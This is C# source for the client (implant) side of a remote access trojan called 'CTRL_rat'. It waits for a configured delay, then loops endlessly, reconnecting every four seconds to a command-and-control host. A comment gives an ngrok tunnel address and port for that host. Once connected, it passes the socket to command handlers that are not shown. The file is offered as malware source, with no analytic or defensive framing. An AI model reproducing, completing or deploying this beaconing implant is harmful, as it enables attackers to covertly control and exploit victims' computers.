using CTRL_rat_Client;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CTRL_rat_Client
{
    class Program
    {
        static void Main(string[] args)
        {
            Thread.Sleep(int.Parse(info.wait));
            while (true) { StartClient(); Thread.Sleep(4000); }
        }
        private static int port = int.Parse(info.port);//14702;
        public static IPHostEntry ipHostInfo = Dns.GetHostEntry(info.host);//("2.tcpngrok.io");
        private static ManualResetEvent connectDone = new ManualResetEvent(false);
        public static handlers handler = new handlers();
        public static IPAddress ipAddress = ipHostInfo.AddressList[0];
        public static IPEndPoint remoteEP = new IPEndPoint(ipAddress, port);
        public static bool amiconnected(Socket s)
        {
            Thread.Sleep(1000);
            if (s == null) { return false; }
            return s.Available != 0;
        }
        private static void StartClient()
        {
            
            Socket connection = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            try
            { 
                connection.BeginConnect(remoteEP, new AsyncCallback(ConnectCallback), connection);
                connectDone.WaitOne();
                var g = amiconnected(connection);
                if (g)
                {
                    node client = new node();
                    client.sock = connection;
                    client.isalive = true;
                    client.OnCompletedRequest = handler.Onmessage;
                    client.OnPartialRequest = handler.Onpartialmessage;
                    client.OnClose = handler.Onclose;
                    client.Main();
                }
            }
            catch (Exception e)
            {
                try {
                    connection.Close(); 
                    connection.Dispose(); 
                } catch { }
                connectDone.Reset();
                Console.WriteLine(e.ToString());
            }
        }

        private static void ConnectCallback(IAsyncResult ar)
        {
            Socket client = (Socket)ar.AsyncState;
            try
            { 
                client.EndConnect(ar);
                Console.WriteLine("Socket connected to {0}",client.RemoteEndPoint.ToString()); 
            }
            catch (Exception e)
            {
                try {
                    client.Close();
                    client.Dispose();
                }
                catch { }
                Console.WriteLine(e.ToString());
            }
            connectDone.Set();
        }
    }
}
